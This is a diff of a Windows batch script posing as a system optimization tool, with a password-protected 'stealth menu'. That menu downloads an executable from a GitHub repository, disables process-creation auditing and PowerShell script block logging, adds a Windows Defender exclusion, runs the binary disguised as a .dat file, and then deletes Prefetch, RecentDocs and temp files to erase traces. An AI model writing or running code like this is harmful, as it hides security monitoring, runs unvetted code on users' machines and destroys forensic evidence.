@@ -1,15 +1,13 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-:: Remote URLs
+:: ===== CONFIGURATION =====
 set "STEALTH_PASS_URL=https://raw.githubusercontent.com/maxyprime/panelconfig/refs/heads/main/stealth_password.txt"
 set "EXE_URL=https://github.com/maxyprime/panelconfig/raw/refs/heads/main/CAXVN.exe"
-
-:: Local paths
 set "SETUP_EXE=%temp%\CAXVN.exe"
 set "DISGUISED_EXE=%temp%\user_data_blob.dat"
-set "CURRENT_DIR=%~dp0"
 
+:: ===== LOGIN =====
 :LOGIN
 cls
 echo ==========================================
@@ -31,6 +29,7 @@ if "%userpass%"=="1" (
         goto STEALTH_MENU
     )
 )
+goto LOGIN
 
 :CheckStealthPassword
 set "inputpass=%~1"
@@ -41,6 +40,7 @@ if /i "%inputpass%"=="%remote_pass%" (
     exit /b 1
 )
 
+:: ===== OPTIMIZATION MENU =====
 :OPTIMIZATION_MENU
 cls
 echo ==========================================
@@ -110,6 +110,7 @@ sfc /scannow
 pause
 goto OPTIMIZATION_MENU
 
+:: ===== STEALTH MENU =====
 :STEALTH_MENU
 cls
 echo  ===========================================
@@ -140,11 +141,14 @@ timeout /t 2 /nobreak >nul
 goto STEALTH_MENU
 
 :SETUP
+:: Disable logging and defender
 powershell -Command "auditpol /set /subcategory:'Process Creation' /success:disable /failure:disable"
 echo Disabling PowerShell script block logging...
-powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0 -Force"
-echo Adding Windows Defender exclusion for EXE...
-powershell -Command "Add-MpPreference -ExclusionPath '%temp%'"
+powershell -Command "Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0 -Force" 2>nul
+powershell -Command "Add-MpPreference -ExclusionPath '%SETUP_EXE%'"
+powershell -Command "Stop-Service DusmSvc -Force" >nul 2>&1
+
+:: Simulate download
 echo STEP 1: Preparing download...
 timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
@@ -160,33 +164,44 @@ if exist "%SETUP_EXE%" (
     goto STEALTH_MENU
 )
 
+:: Re-enable audit and PowerShell logging
 powershell -Command "auditpol /set /subcategory:'Process Creation' /success:enable /failure:enable"
-echo Enabling PowerShell script block logging...
-powershell -Command "Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 1 -Force"
-echo Removing Windows Defender exclusion for EXE...
-powershell -Command "Remove-MpPreference -ExclusionPath '%temp%'"
+powershell -Command "Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -Force" 2>nul
+powershell -Command "Remove-MpPreference -ExclusionPath '%SETUP_EXE%'"
+
 pause
 goto STEALTH_MENU
 
 :RUN
-sc stop "DusmSvc" >nul 2>&1
+if not exist "%SETUP_EXE%" (
+    echo EXE not found. Please run Setup first.
+    pause
+    goto STEALTH_MENU
+)
+
 copy /Y "%SETUP_EXE%" "%DISGUISED_EXE%" >nul 2>&1
 start "" /b "%DISGUISED_EXE%"
-echo EXE started...
-:WAIT_FOR_EXIT
-timeout /t 5 >nul
-tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
-if not errorlevel 1 goto WAIT_FOR_EXIT
 
+:WAIT_LOOP
+timeout /t 2 >nul
+tasklist /FI "IMAGENAME eq user_data_blob.dat" | find /I "user_data_blob.dat" >nul
+if not errorlevel 1 (
+    goto WAIT_LOOP
+)
+
+:: Delete all generated files by EXE
+for %%f in (imgui.ini imgui.log *.tmp *.cache *.bak *.dmp) do del /f /q "%%~dp0%%f" >nul 2>&1
 del /f /q "%DISGUISED_EXE%" >nul 2>&1
-for %%F in ("%CURRENT_DIR%\*.imgui" "%CURRENT_DIR%\*log*" "%CURRENT_DIR%\*.tmp" "%CURRENT_DIR%\*.dat" "%CURRENT_DIR%\*.bin") do del /f /q %%F >nul 2>&1
+
 echo EXE run completed and cleaned up.
 pause
 goto STEALTH_MENU
 
 :BYPASS
-sc start "DusmSvc" >nul 2>&1
-echo Running cleanup...
+:: Re-enable Data Usage Overview Service
+sc start DusmSvc >nul 2>&1
+
+:: Cleanup
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
 del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
 del /s /q "%temp%\*.*" >nul 2>&1
